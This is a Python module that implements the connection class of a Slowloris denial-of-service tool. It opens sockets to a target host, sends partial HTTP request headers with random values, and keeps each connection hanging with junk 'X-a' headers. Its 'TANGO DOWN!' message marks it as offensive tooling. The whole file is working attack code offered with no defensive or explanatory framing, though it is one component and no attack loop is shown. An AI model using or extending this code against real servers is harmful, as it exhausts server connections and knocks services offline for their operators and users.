"""This module implements the SlowLoris connection."""

import random
import socket

class LorisConnection:
    """SlowLoris connection."""

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.settimeout(5)
        try:
            # TODO: Add SSL support
            self.socket.connect((self.host, self.port))
            self.socket.settimeout(None)
            self.connected = True
        except(TimeoutError, socket.timeout):
            self.connected = False
            print("TANGO DOWN! (host unreachable)")

    def is_connected(self):
        """Tests if the connection has been established."""
        return self.connected

    def close(self):
        """Closes the connection."""
        self.socket.close()

    def send_headers(self, uagent):
        """Sends headers."""
        template = "GET /?{} HTTP/1.1\r\n{}\r\nAccept-language: en-US,en,q=0.5\r\n"
        try:
            self.socket.send(template.format(random.randrange(0, 2000), uagent).encode("ascii"))
        except socket.timeout:
            pass
        return self

    def keep_alive(self):
        """Sends garbage to keep the connection alive."""
        try:
            self.socket.send("X-a: {}\r\n".format(random.randint(0, 5000)).encode("ascii"))
        except socket.timeout:
            pass
